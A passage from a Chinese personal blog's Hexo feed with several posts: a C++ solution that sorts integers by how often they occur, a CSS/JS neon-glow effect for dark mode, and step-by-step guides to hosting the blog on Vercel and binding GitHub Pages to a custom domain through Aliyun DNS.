        <content type="html"><![CDATA[<p>【问题描述】</p><p>　　给定n个整数，请统计出每个整数出现的次数，按出现次数从多到少的顺序输出。 </p><p>【输入形式】</p><p>　　输入的第一行包含一个整数n，表示给定数字的个数。<br>　　第二行包含n个整数，相邻的整数之间用一个空格分隔，表示所给定的整数。 </p><p>【输出形式】</p><p>　　输出多行，每行包含两个整数，分别表示一个给定的整数和它出现的次数。按出现次数递减的顺序输出。如果两个整数出现的次数一样多，则先输出值较小的，然后输出值较大的。</p><p>【样例输入】</p><p>　　12<br>　　5 2 3 3 1 3 4 2 5 2 3 5 </p><p>【样例输出】</p><p>　　3 4<br>　　2 3<br>　　5 3<br>　　1 1<br>　　4 1 </p><p>【评分标准】</p><p>　　<strong>评测用例规模与约定</strong><br>　　1 ≤ n ≤ 1000，给出的数都是不超过1000的非负整数。</p><h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h3><h3 id="（1）将每个数字与其出现频率绑定定义为Pair类，定义Pair类数组"><a href="#（1）将每个数字与其出现频率绑定定义为Pair类，定义Pair类数组" class="headerlink" title="（1）将每个数字与其出现频率绑定定义为Pair类，定义Pair类数组;"></a>（1）将每个数字与其出现频率绑定定义为Pair类，定义Pair类数组;</h3><h3 id="（2）接收输入，判断输入数字是否存在，存在则对应数字频率加一，不存在则写入数字并频率加一"><a href="#（2）接收输入，判断输入数字是否存在，存在则对应数字频率加一，不存在则写入数字并频率加一" class="headerlink" title="（2）接收输入，判断输入数字是否存在，存在则对应数字频率加一，不存在则写入数字并频率加一;"></a>（2）接收输入，判断输入数字是否存在，存在则对应数字频率加一，不存在则写入数字并频率加一;</h3><h3 id="（3）sort函数自定义排序"><a href="#（3）sort函数自定义排序" class="headerlink" title="（3）sort函数自定义排序"></a>（3）sort函数自定义排序</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 1000<span class="comment">// 测试请将N改小</span></span></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span>  std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pair</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">int</span> num = <span class="number">0</span>;<span class="comment">// 数字</span></span><br><span class="line"><span class="type">int</span> fre = <span class="number">0</span>;<span class="comment">// 频率</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inArray</span><span class="params">(<span class="type">int</span> n, Pair *p, <span class="type">int</span> &amp;pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pos; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (p[i].num == n)</span><br><span class="line">&#123;</span><br><span class="line">p[i].fre++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;<span class="comment">// 该数字已存在</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p[pos].num = n;</span><br><span class="line">p[pos].fre++;</span><br><span class="line">pos++;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 该数字不存在</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp_fre</span><span class="params">(Pair x, Pair y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (x.fre == y.fre)</span><br><span class="line"><span class="keyword">return</span> x.num &lt; y.num;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> x.fre &gt; y.fre;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">out</span><span class="params">(Pair *p, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; p[i].num &lt;&lt; <span class="string">&#x27; &#x27;</span> &lt;&lt; p[i].fre &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">initial</span><span class="params">(Pair *p, <span class="type">int</span> n, <span class="type">int</span> &amp;pos)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> temp; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">cin &gt;&gt; temp;</span><br><span class="line"><span class="built_in">inArray</span>(temp, p, pos);<span class="comment">// 判断读取的数字是否已经存在，pos表示当前pair数组中存放的结果总数</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span>  <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> n, pos = <span class="number">0</span>;<span class="comment">// pos对应下一个数字存放的下标</span></span><br><span class="line">Pair pair[N];</span><br><span class="line">cin &gt;&gt; n;<span class="comment">// 数字个数</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">initial</span>(pair, n, pos);</span><br><span class="line"><span class="built_in">sort</span>(pair, pair + pos, cmp_fre);</span><br><span class="line"><span class="built_in">out</span>(pair, pos);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="如果有更好的写法欢迎在评论区给出噢"><a href="#如果有更好的写法欢迎在评论区给出噢" class="headerlink" title="如果有更好的写法欢迎在评论区给出噢^_^"></a>如果有更好的写法欢迎在评论区给出噢^_^</h3>]]></content>
      
      
      <categories>
          
          <category> c++ </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c++刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑夜模式文字霓虹灯特效</title>
      <link href="/post/c22ddd92.html"/>
      <url>/post/c22ddd92.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>博客开启黑夜模式以后为大标题和个人卡片添加霓虹灯特效</p><h2 id="添加代码"><a href="#添加代码" class="headerlink" title="添加代码"></a>添加代码</h2><p>打开Blog根目录/source/css/custom.css，路径中缺少的文件夹或文件直接创建即可，写入下列代码</p><p>可以把‘—theme-color’修改为你喜欢的颜色，例如墨绿色：rgb(91,165,133)</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 夜间模式菜单栏发光字 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#nav</span> <span class="selector-class">.site-page</span>,</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#nav</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.menus_item</span> <span class="selector-class">.menus_item_child</span> <span class="selector-tag">li</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">2px</span> <span class="built_in">var</span>(--theme-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 手机端适配 */</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span> <span class="selector-id">#sidebar</span> <span class="selector-id">#sidebar-menus</span> <span class="selector-class">.menus_items</span> <span class="selector-class">.site-page</span> &#123;</span><br><span class="line">  <span class="attribute">text-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">2px</span> <span class="built_in">var</span>(--theme-color) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="新建脚本文件"><a href="#新建脚本文件" class="headerlink" title="新建脚本文件"></a>新建脚本文件</h2><p>打开Blog根目录\source\js\light.js，路径中缺少的文件夹或文件直接创建即可，写入下列代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 霓虹灯效果</span></span><br><span class="line"><span class="comment">// 颜色数组</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">&quot;#39c5bb&quot;</span>, <span class="string">&quot;#f14747&quot;</span>, <span class="string">&quot;#f1a247&quot;</span>, <span class="string">&quot;#f1ee47&quot;</span>, <span class="string">&quot;#b347f1&quot;</span>, <span class="string">&quot;#1edbff&quot;</span>, <span class="string">&quot;#ed709b&quot;</span>, <span class="string">&quot;#5636ed&quot;</span>];</span><br><span class="line"><span class="comment">// 颜色索引</span></span><br><span class="line"><span class="keyword">var</span> idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 切换颜色</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">changeColor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 仅夜间模式才启用</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;html&#x27;</span>)[<span class="number">0</span>].<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-theme&#x27;</span>) == <span class="string">&#x27;dark&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-name&quot;</span>))</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-name&quot;</span>).<span class="property">style</span>.<span class="property">textShadow</span> = arr[idx] + <span class="string">&quot; 0 0 15px&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-title&quot;</span>))</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-title&quot;</span>).<span class="property">style</span>.<span class="property">textShadow</span> = arr[idx] + <span class="string">&quot; 0 0 15px&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-subtitle&quot;</span>))</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-subtitle&quot;</span>).<span class="property">style</span>.<span class="property">textShadow</span> = arr[idx] + <span class="string">&quot; 0 0 10px&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;post-info&quot;</span>))</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;post-info&quot;</span>).<span class="property">style</span>.<span class="property">textShadow</span> = arr[idx] + <span class="string">&quot; 0 0 5px&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;author-info__name&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">textShadow</span> = arr[idx] + <span class="string">&quot; 0 0 12px&quot;</span>;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;author-info__description&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">textShadow</span> = arr[idx] + <span class="string">&quot; 0 0 12px&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        idx++;</span><br><span class="line">        <span class="keyword">if</span> (idx == <span class="number">8</span>) &#123;</span><br><span class="line">            idx = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 白天模式恢复默认</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-name&quot;</span>))</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-name&quot;</span>).<span class="property">style</span>.<span class="property">textShadow</span> = <span class="string">&quot;#1e1e1ee0 1px 1px 1px&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-title&quot;</span>))</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-title&quot;</span>).<span class="property">style</span>.<span class="property">textShadow</span> = <span class="string">&quot;#1e1e1ee0 1px 1px 1px&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-subtitle&quot;</span>))</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;site-subtitle&quot;</span>).<span class="property">style</span>.<span class="property">textShadow</span> = <span class="string">&quot;#1e1e1ee0 1px 1px 1px&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;post-info&quot;</span>))</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;post-info&quot;</span>).<span class="property">style</span>.<span class="property">textShadow</span> = <span class="string">&quot;#1e1e1ee0 1px 1px 1px&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;author-info__name&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">textShadow</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;author-info__description&quot;</span>)[<span class="number">0</span>].<span class="property">style</span>.<span class="property">textShadow</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开启计时器</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="built_in">setInterval</span>(changeColor, <span class="number">1200</span>);</span><br></pre></td></tr></table></figure><h2 id="引入文件"><a href="#引入文件" class="headerlink" title="引入文件"></a>引入文件</h2><p>打开主题配置文件_config.butterfly.yml，搜索inject并按下列格式补充完整</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/custom.css&quot;</span> <span class="string">media=&quot;defer&quot;</span> <span class="string">onload=&quot;this.media=&#x27;all&#x27;&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;script</span> <span class="string">defer</span> <span class="string">src=&quot;/js/light.js&quot;&gt;&lt;/script&gt;</span> <span class="comment"># 霓虹灯(必须defer否则有时候会不生效)</span></span><br></pre></td></tr></table></figure><h2 id="hexo三连查看效果"><a href="#hexo三连查看效果" class="headerlink" title="hexo三连查看效果"></a>hexo三连查看效果</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打卡记录</title>
      <link href="/post/d1ee6067.html"/>
      <url>/post/d1ee6067.html</url>
      
        <content type="html"><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><h1 id="今天也要元气满满"><a href="#今天也要元气满满" class="headerlink" title="今天也要元气满满"></a>今天也要元气满满</h1></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>使用Vercel加速博客</title>
      <link href="/post/f6bf5d88.html"/>
      <url>/post/f6bf5d88.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Vercel在全球都分布有CDN节点，比Github自带的Github Page更加稳定且访问速度更快，并且部署简单而且不用花钱</p><h2 id="Vercel注册"><a href="#Vercel注册" class="headerlink" title="Vercel注册"></a>Vercel注册</h2><p>如果你看过之前的文章：<a href="https://www.dqywy.top/post/d0d1b7a9.html">添加Twikoo实现博客在线评论</a>的话，你应该已经注册好了自己的Vercel账号</p><p>若未注册请参考<a href="https://www.dqywy.top/post/d0d1b7a9.html">添加Twikoo实现博客在线评论</a></p><p>或者自行注册：<a href="https://vercel.com/signup">https://vercel.com/signup</a></p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>点击头像来到首页并点击添加project</p><p><img src="https://s1.ax1x.com/2023/04/30/p98K6Sg.png" alt=""></p><p>如果有你的仓库地址就可以直接import，没有的话就点击下方的Import Third-Party Git Respository并输入你的Github仓库网址(例如我的是：hellodqy.github.io)</p><p><img src="https://s1.ax1x.com/2023/04/30/p98KclQ.png" alt=""></p><p>保持默认选项点击Deploy即可</p><h2 id="修改域名"><a href="#修改域名" class="headerlink" title="修改域名"></a>修改域名</h2><p>由于Vercel的域名被墙了，所以我们需要将其修改为我们的个人域名(个人域名购买请参考<a href="https://www.dqywy.top/post/d0d1b7a9.html">添加Twikoo实现博客在线评论</a>中的申请个人域名章节)</p><p>再次回到首页，点击你新建的项目</p><p><img src="https://s1.ax1x.com/2023/04/30/p98KofU.png" alt=""></p><p>点击settings</p><p><img src="https://s1.ax1x.com/2023/05/01/p98MC1e.png" alt=""></p><p>点击Domains</p><p><img src="https://s1.ax1x.com/2023/05/01/p98MSfO.png" alt=""></p><p>在Domains填入你的个人域名</p><p><img src="https://s1.ax1x.com/2023/05/01/p98M9pD.png" alt=""></p><h2 id="DNS解析-以阿里云为例"><a href="#DNS解析-以阿里云为例" class="headerlink" title="DNS解析(以阿里云为例)"></a>DNS解析(以阿里云为例)</h2><p>Vercel一般会给出两行记录要你添加到你的DNS供应商</p><p>首页打开控制台</p><p><img src="https://s1.ax1x.com/2023/04/26/p9Ka81O.png" alt=""></p><p>点击图片中的云解析</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KanB9.png" alt=""></p><p>点击你购买的域名</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KamnJ.png" alt=""></p><p>点击添加记录</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KaZX4.png" alt=""></p><p>按照Vercel给的格式填：</p><ol><li>Type：A</li></ol><p>​      主机记录：@</p><p>​      解析：保持默认</p><p>​      记录值：xx.xx.xx.xx</p><p>​      TTL：10分钟</p><ol><li>Type：CNAME</li></ol><p>​      主机记录：www</p><p>​      解析：保持默认</p><p>​      记录值：xxx-dns.com</p><p>​      TTL：10分钟</p><h2 id="重新部署"><a href="#重新部署" class="headerlink" title="重新部署"></a>重新部署</h2><p>修改完以后回到Vercel首页，打开项目</p><p><img src="https://s1.ax1x.com/2023/04/30/p98KofU.png" alt=""></p><p>点击Deployments选项</p><p><img src="https://s1.ax1x.com/2023/05/01/p98Qk2F.png" alt=""></p><p>点击带有current标识的版本最右边的三个点，点击Redeploy</p><p><img src="https://s1.ax1x.com/2023/05/01/p98QF8U.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/05/01/p98QiCT.png" alt=""></p><p>部署完成耐心等待即可~</p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 插件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客加速 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github Page绑定个人域名</title>
      <link href="/post/fa674e5f.html"/>
      <url>/post/fa674e5f.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在之前的<a href="https://dqywy.top/post/d0d1b7a9.html">配置Twikoo评论</a>一文中我们购买了自己的域名，当时只用了二级域名解决Vercel域名被墙的问题，现在我们把Github Page的域名修改为我们自己的域名</p><h2 id="DNS解析-以阿里云为例"><a href="#DNS解析-以阿里云为例" class="headerlink" title="DNS解析(以阿里云为例)"></a>DNS解析(以阿里云为例)</h2><p>阿里云首页打开控制台</p><p><img src="https://s1.ax1x.com/2023/04/26/p9Ka81O.png" alt=""></p><p>点击图片中的云解析</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KanB9.png" alt=""></p><p>点击你购买的域名</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KamnJ.png" alt=""></p><p>点击添加记录</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KaZX4.png" alt=""></p><p>我们需要添加两条记录：</p><ol><li><p>记录类型：CNAME</p><p>主机记录：@</p><p>解析请求来源：保持默认</p><p>记录值：网站域名，例如我的是：hellodqy.github.io</p><p>TTL：10分钟</p></li><li><p>记录类型：CNAME</p><p>主机记录：www</p><p>解析请求来源：保持默认</p><p>记录值：网站域名</p><p>TTL：10分钟</p></li></ol><p><img src="https://s1.ax1x.com/2023/04/26/p9KaVcF.png" alt=""></p><h2 id="添加CNAME文件"><a href="#添加CNAME文件" class="headerlink" title="添加CNAME文件"></a>添加CNAME文件</h2><p>打开Blog根目录/source，新建一个文件名为CNAME的无后缀文件，填入你购买的个人域名，不需要添加<a href="https://前缀，例如我的是：">https://前缀，例如我的是：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dqywy.top</span><br></pre></td></tr></table></figure><h2 id="Github-Page添加个人域名"><a href="#Github-Page添加个人域名" class="headerlink" title="Github Page添加个人域名"></a>Github Page添加个人域名</h2><p>进入.github.io仓库，打开settings</p><p><img src="https://s1.ax1x.com/2023/04/30/p98A87F.png" alt=""></p><p>打开Pages选项</p><p><img src="https://s1.ax1x.com/2023/04/30/p98A30U.png" alt=""></p><p>下拉页面，找到Custom domain并填入你购买的个人域名，勾选Enforce HTTPS</p><h4 id="注意：这里需要等待一段加载时间才能勾选Enforce-HTTPS"><a href="#注意：这里需要等待一段加载时间才能勾选Enforce-HTTPS" class="headerlink" title="注意：这里需要等待一段加载时间才能勾选Enforce HTTPS"></a>注意：这里需要等待一段加载时间才能勾选Enforce HTTPS</h4><p><img src="https://s1.ax1x.com/2023/04/30/p98AJk4.png" alt=""></p><p>完成以后即可通过你购买的个人域名访问你的网站了</p><h2 id="解决部署后需要重新在Github绑定域名的问题"><a href="#解决部署后需要重新在Github绑定域名的问题" class="headerlink" title="解决部署后需要重新在Github绑定域名的问题"></a>解决部署后需要重新在Github绑定域名的问题</h2><p>打开Blog根目录的站点配置文件_config.yml，搜索skip_render并填写CNAME使每次部署的时候CNAME不被渲染</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">skip_render:</span> <span class="string">CNAME</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现网站动态标题</title>
      <link href="/post/15286781.html"/>
      <url>/post/15286781.html</url>
      
        <content type="html"><![CDATA[<h2 id="添加脚本文件"><a href="#添加脚本文件" class="headerlink" title="添加脚本文件"></a>添加脚本文件</h2><p>打开<code>Blog根目录/source/js/title.js</code>，路径中缺失的文件夹或文件直接新建即可</p><p>写入下列代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态标题</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">OriginTitile</span> = <span class="variable language_">document</span>.<span class="property">title</span>;</span><br><span class="line"><span class="keyword">var</span> titleTime;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;visibilitychange&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">hidden</span>) &#123;</span><br><span class="line">        <span class="comment">//离开当前页面时标签显示内容</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;不要走嘛(´•̥̥̥ω•̥̥̥`)&#x27;</span>;</span><br><span class="line">        <span class="built_in">clearTimeout</span>(titleTime);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//返回当前页面时标签显示内容</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">title</span> = <span class="string">&#x27;欢迎回来(✪ω✪)&#x27;</span>;</span><br><span class="line">        <span class="comment">//两秒后变回正常标题</span></span><br><span class="line">        titleTime = <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">document</span>.<span class="property">title</span> = <span class="title class_">OriginTitile</span>;</span><br><span class="line">        &#125;, <span class="number">2000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="引用脚本文件"><a href="#引用脚本文件" class="headerlink" title="引用脚本文件"></a>引用脚本文件</h2><p>打开主题配置文件<code>_config.butterfly.yml</code>并按下列格式补充完整</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span 